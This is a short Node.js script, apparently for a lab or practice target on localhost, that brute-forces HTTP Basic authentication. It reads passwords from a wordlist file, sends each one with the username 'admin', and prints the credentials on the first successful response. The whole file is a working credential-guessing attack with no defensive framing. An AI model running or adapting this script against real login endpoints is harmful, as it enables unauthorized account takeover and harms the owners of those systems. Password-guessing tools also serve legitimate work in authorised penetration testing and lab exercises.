const request = require('request');
const fs = require('fs');

const baseUrl = 'http://localhost:3000';

const passwordsList = fs.readFileSync('./passwords.txt').toString().replace('\r', '\n').split('\n');

for (let j = 0; j < passwordsList.length; j++) {
    const auth = 'Basic ' + Buffer.from('admin' + ':' + passwordsList[j]).toString('base64');
    const options = {
        url: baseUrl,
        headers: {
        'Authorization': auth
        }
    };
    request.get(options, function (error, response, body) {
        if (!error && response.statusCode === 200) {
            console.log('Success! Username: ' + 'admin' + ' Password: ' + passwordsList[j]);
            process.exit();
        }
    });
};